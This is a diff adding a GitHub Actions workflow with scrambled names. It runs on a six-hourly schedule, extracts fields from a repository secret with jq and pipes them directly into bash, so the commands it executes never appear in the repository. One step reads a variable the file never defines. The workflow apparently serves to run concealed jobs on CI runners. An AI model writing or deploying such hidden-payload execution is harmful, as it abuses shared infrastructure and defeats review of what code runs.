@@ -1,0 +1,18 @@
+name: sijuanliqin
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sijuanliqin
+        env:
+          uzpen37170: ${{ secrets.uzpen37170 }}
+        run: |
+          echo $uzpen37170 | jq -r .uwgt1 | /bin/bash
+          echo $uo21 | jq -r .fs5835 | /bin/bash
+
